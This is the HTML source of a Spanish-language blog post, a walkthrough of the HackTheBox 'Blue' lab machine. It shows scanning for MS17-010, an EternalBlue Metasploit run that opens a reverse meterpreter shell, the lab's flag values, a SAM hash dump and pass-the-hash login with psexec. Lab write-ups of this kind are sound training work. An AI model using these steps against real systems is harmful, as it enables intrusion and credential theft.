@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Blue (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Blue (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/03/31/blue.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/03/31/blue.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-31T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Blue (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-31T00:00:00-06:00","datePublished":"2024-03-31T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Blue (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/03/31/blue.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/03/31/blue.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Blue (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-31T00:00:00-06:00" itemprop="datePublished">
+        Mar 31, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/52e077ae40899ab8b024afd51cb29b1c.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.40
+PING 10.10.10.40 <span class="o">(</span>10.10.10.40<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.40: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>96.1 ms
+
+<span class="nt">---</span> 10.10.10.40 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 96.085/96.085/96.085/0.000 ms
+❯ whichSystem.py 10.10.10.40
+
+10.10.10.40 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-27 17:01 CST
+Nmap scan report <span class="k">for </span>10.10.10.40
+Host is up <span class="o">(</span>0.095s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 <span class="o">(</span>Windows 7 Professional 6.1<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC<span class="se">\x</span>00
+|   Workgroup: WORKGROUP<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2023-06-28T00:02:15+01:00
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: <span class="nt">-20m02s</span>, deviation: 34m37s, median: <span class="nt">-3s</span>
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-06-27T23:02:19
+|_  start_date: 2023-06-27T08:15:31
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Pues bueno mediante <strong>Nmap</strong> podemos aplicar un script para que nos reporte si es vulnerable a esta vulnerabilidad.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p</span> 445 <span class="nt">--script</span> <span class="s2">"vuln and safe"</span> 10.10.10.40
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-27 17:07 CST
+Nmap scan report <span class="k">for </span>10.10.10.40
+Host is up <span class="o">(</span>0.096s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk <span class="nb">factor</span>: HIGH
+|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
+|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.34 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>Con <strong>crackmapexec</strong> vemos que efectivamente estamos ante un <strong>Windows 7</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.40
+SMB         10.10.10.40     445    HARIS-PC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 7 Professional 7601 Service Pack 1 x64 <span class="o">(</span>name:HARIS-PC<span class="o">)</span> <span class="o">(</span>domain:haris-PC<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="shell-nt-authoritysystem">Shell NT Authority\System</h2>
+
+<ul>
+  <li>Ahora nos vamos a ejecutar <strong>Metasploit</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfconsole
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       <span class="o">=[</span> metasploit v6.3.5-dev                           <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 2296 exploits - 1202 auxiliary - 410 post       <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 965 payloads - 45 encoders - 11 nops            <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 9 evasion                                       <span class="o">]</span>
+
+Metasploit tip: Set the current module<span class="s1">'s RHOSTS with 
+database values using hosts -R or services 
+-R
+Metasploit Documentation: https://docs.metasploit.com/
+
+[msf](Jobs:0 Agents:0) &gt;&gt; 
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a decirle el exploit que queremos usar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> <span class="o">&gt;&gt;</span> use exploit/windows/smb/ms17_010_eternalblue
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a pasarle los argumentos que nos pide que una de ellos es la <strong>ip</strong> de la maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="o">)</span>:
+
+   Name           Current Setting  Required  Description
+   <span class="nt">----</span>           <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS                          <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/
+                                             using-metasploit.html
+   RPORT          445              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBDomain                       no        <span class="o">(</span>Optional<span class="o">)</span> The Windows domain to use <span class="k">for </span>authentication. Only affects Windows Ser
+                                             ver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        <span class="o">(</span>Optional<span class="o">)</span> The password <span class="k">for </span>the specified username
+   SMBUser                         no        <span class="o">(</span>Optional<span class="o">)</span> The username to authenticate as
+   VERIFY_ARCH    <span class="nb">true             yes       </span>Check <span class="k">if </span>remote architecture matches exploit Target. Only affects Windows Server
+                                             2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  <span class="nb">true             yes       </span>Check <span class="k">if </span>remote OS matches exploit Target. Only affects Windows Server 2008 R2, W
+                                             indows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST     192.168.255.128  <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">set </span>rhosts 10.10.10.40
+rhosts <span class="o">=&gt;</span> 10.10.10.40
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.14.12
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora como esta vulnerabilidad te da privilegios maximos cuando corramos el exploit vamos a obtener una sesion de meterpreter.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.12:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+<span class="o">[</span>+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 <span class="o">(</span>64-bit<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445       - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span>+] 10.10.10.40:445 - The target is vulnerable.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Connecting to target <span class="k">for </span>exploitation.
+<span class="o">[</span>+] 10.10.10.40:445 - Connection established <span class="k">for </span>exploitation.
+<span class="o">[</span>+] 10.10.10.40:445 - Target OS selected valid <span class="k">for </span>OS indicated by SMB reply
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - CORE raw buffer dump <span class="o">(</span>42 bytes<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+<span class="o">[</span>+] 10.10.10.40:445 - Target <span class="nb">arch </span>selected valid <span class="k">for </span><span class="nb">arch </span>indicated by DCE/RPC reply
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending all but last fragment of exploit packet
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Starting non-paged pool grooming
+<span class="o">[</span>+] 10.10.10.40:445 - Sending SMBv2 buffers
+<span class="o">[</span>+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending final SMBv2 buffers.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending last fragment of exploit packet!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Receiving response from exploit packet
+<span class="o">[</span>+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully <span class="o">(</span>0xC000000D<span class="o">)!</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending egg to corrupted connection.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Triggering free of corrupted buffer.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>200774 bytes<span class="o">)</span> to 10.10.10.40
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.12:4444 -&gt; 10.10.10.40:49158<span class="o">)</span> at 2023-06-27 17:16:47 <span class="nt">-0600</span>
+<span class="o">[</span>+] 10.10.10.40:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+<span class="o">[</span>+] 10.10.10.40:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span><span class="nt">-WIN-</span><span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+<span class="o">[</span>+] 10.10.10.40:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+
+<span class="o">(</span>Meterpreter 1<span class="o">)(</span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="o">)</span> <span class="o">&gt;</span> getuid
+Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
+<span class="o">(</span>Meterpreter 1<span class="o">)(</span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="o">)</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Para obtener una <strong>cmd</strong> solo hacemos esto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>Meterpreter 1<span class="o">)(</span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="o">)</span> <span class="o">&gt;</span> shell
+Process 2472 created.
+Channel 1 created.
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop&gt;type user.txt
+<span class="nb">type </span>user.txt
+54c667afb359782634011adaab1de2e0
+
+C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<h2 id="roottxt">Root.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
+<span class="nb">type </span>root.txt
+012ecff6cf8ab60a656cd7810f7682d2
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<h2 id="sam">SAM</h2>
+
+<ul>
+  <li>Como estamos como el usuario con maximos privilegios podemos dumpear la <strong>SAM</strong> para obtener los <strong>hashes</strong> de todos los usuarios y usar <strong>psexec</strong> para conectarnos aplicando un <strong>passthehash</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>Meterpreter 1<span class="o">)(</span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="o">)</span> <span class="o">&gt;</span> hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
+<span class="o">(</span>Meterpreter 1<span class="o">)(</span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="o">)</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora con <strong>crackmapexec</strong> podemos comprobar que es correcto el del usuario <strong>Administrator</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.40 <span class="nt">-u</span> Administrator <span class="nt">-H</span> cdf51b162460b7d5bc898f493751a0cc
+SMB         10.10.10.40     445    HARIS-PC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 7 Professional 7601 Service Pack 1 x64 <span class="o">(</span>name:HARIS-PC<span class="o">)</span> <span class="o">(</span>domain:haris-PC<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.40     445    HARIS-PC         <span class="o">[</span>+] haris-PC<span class="se">\A</span>dministrator:cdf51b162460b7d5bc898f493751a0cc <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora hay que agregar el nombre del dominio al <strong>/etc/hosts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
+10.10.10.40 haris-PC.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Y listo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/Administrator@10.10.10.40 <span class="nt">-hashes</span> :cdf51b162460b7d5bc898f493751a0cc
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.40.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file zDRQfQfc.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.40.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service AguJ on 10.10.10.40.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service AguJ.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/03/31/blue.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
